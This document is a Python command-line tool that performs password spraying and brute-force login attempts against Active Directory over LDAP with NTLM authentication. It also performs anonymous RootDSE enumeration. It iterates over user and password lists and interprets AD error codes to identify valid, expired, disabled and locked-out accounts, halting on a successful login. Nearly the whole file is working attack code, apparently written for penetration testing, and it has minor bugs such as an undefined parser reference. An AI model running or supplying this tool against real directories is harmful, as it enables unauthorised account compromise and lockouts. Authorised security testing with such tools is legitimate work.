import ldap3
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
from argparse import ArgumentParser
from os import path
import sys
from sys import exit
import time

##################################################
# Fancy print statements
##################################################
def print_success(msg):
    print('\033[1;32m[+] \033[1;m{}'.format(msg))

def print_status(msg):
    print('\033[1;34m[*] \033[1;m{}'.format(msg))

def print_failure(msg):
    print('\033[1;31m[-] \033[1;m{}'.format(msg))

def print_error(msg):
    print('\033[1;33m[!] \033[1;m{}'.format(msg))

def file_exists(parser, filename):
    # Verify input files exists
    if not path.exists(filename):
        parser.error("Input file not found: {}".format(filename))
    return [x.strip() for x in open(filename)]

def error_handle():
    while True:
        user_input = input('[+] Do you want to continue ? : ')
        if user_input in ['y', 'n']:
            break
        else:
            print('Enter y or n')
    
    if user_input.lower() == "n":
        # Exit for safety 
        exit()

def anon_auth(args):
    server = ""
    if args.ssl:
        server = ldap3.Server(args.srv, get_info = ldap3.ALL, port = 636, use_ssl = True)
    else:
        server = ldap3.Server(args.srv, get_info = ldap3.ALL, port = 389, use_ssl = False)                

    c = ldap3.Connection(server)
    
    if not c.bind():
        print_failure("Anonymous RootDSE bind failed")
        exit()
    else:
        print_success("Anonymous RootDSE bind success")
        print(server.info)
        exit()

def launcher(args):
    run_query = True
    data_len = 0
    for user in args.user:
        for passwd in args.passwd:
            try:
                # Sleep between each attempt
                time.sleep(0.2)
                server = ""

                if args.ssl:
                    server = ldap3.Server(args.srv, get_info = ldap3.ALL, port = 636, use_ssl = True)
                else:
                    server = ldap3.Server(args.srv, get_info = ldap3.ALL, port = 389, use_ssl = False)

                # Domain seems to be ignored here but we provide anyway, auth succeeds without it though
                c = ldap3.Connection(server, user="{domain}\\{user}".format(domain=args.domain,user=user), password=passwd, authentication=NTLM)

                if not c.bind():
                    if "data 52e" in c.result['message']:
                        print_status("Error - {}".format(str(c.result['message'])) + c.result['description'])
                        print_status("Error - Invalid Credentials for user : " + user)
                    elif "data 773" in c.result['message']:
                        print_status("Error - {}".format(str(c.result['message'])) + c.result['description'])
                        print_success("VALID - But user must reset password : " + user)
                        exit()
                    elif "data 533" in c.result['message']:
                        print_status("Error - {}".format(str(c.result['message'])) + c.result['description'])
                        print_error("Error - User is disabled : " + user)
                    elif "data 532" in c.result['message']:
                        print_status("Error - {}".format(str(c.result['message'])) + c.result['description'])
                        print_error("Error - User password has expired : " + user)
                    elif "data 775" in c.result['message']:
                        print_status("Error - {}".format(str(c.result['message'])) + c.result['description'])
                        print_failure("WARNING - Account is locked - Exiting : " + user)
                        error_handle()
                    else:
                        print_error("Unknown Error - {}".format(str(c.result['message'])) + c.result['description'])
                        error_handle()

                else:
                    # Stop here unless told to continue
                    if args.no_stop_on_success:
                        print_success("WIN - : " + user)
                    else:
                        print_success("WIN - Exiting: " + user)
                        exit()

            except Exception as e:
                print_error("Error - {}".format(str(e)))

def main():

    args = ArgumentParser()
    # Main Ldap query type
    args.add_argument('-s', '-srv', dest='srv', type=str, default='', help='LDAP Server')
    args.add_argument('--ssl', '-secure', dest='ssl', action='store_true', help='Use SSL (port 636)')
    args.add_argument('-A', '-anon', dest='anon', action='store_true', help='Perform anonymous RootDSE bind')
    args.add_argument('-d', dest='domain', help='Active Directory Domain')
    args.add_argument('--no-stop', dest='no_stop_on_success', action='store_true', help='Do not stop when valid account is found (will stop by default)')

    # Domain Authentication
    user = args.add_mutually_exclusive_group(required=False)
    user.add_argument('-u', dest='user', type=str, action='append', help='Single username')
    user.add_argument('-U', dest='user', default=False, type=lambda x: file_exists(args, x), help='Users.txt file')

    passwd = args.add_mutually_exclusive_group()
    passwd.add_argument('-p', dest='passwd', action='append', default=[], help='Single password')
    passwd.add_argument('-P', dest='passwd', default=False, type=lambda x: file_exists(args, x),
                        help='Password.txt file')
    passwd.add_argument('-H', dest='hash', type=str, default='', help='Use Hash for Authentication')

    # Print help if no arguments given
    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    args = args.parse_args()

    # Not needed for anonymous bind
    if args.user:
        if not args.domain:
            print(args.domain)
            print_failure("Domain required for authentication")
            exit()

    if args.anon:
        anon_auth(args)

    if args.hash:
        args.passwd.append(False)
    #elif not args.passwd:
        # Get password if not provided
        #args.passwd = [getpass("Enter password, or continue with null-value: ")]
    try:
        launcher(args)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected, Closing...")
        exit(0)

if __name__ == "__main__":
    # execute only if run as a script
    main()
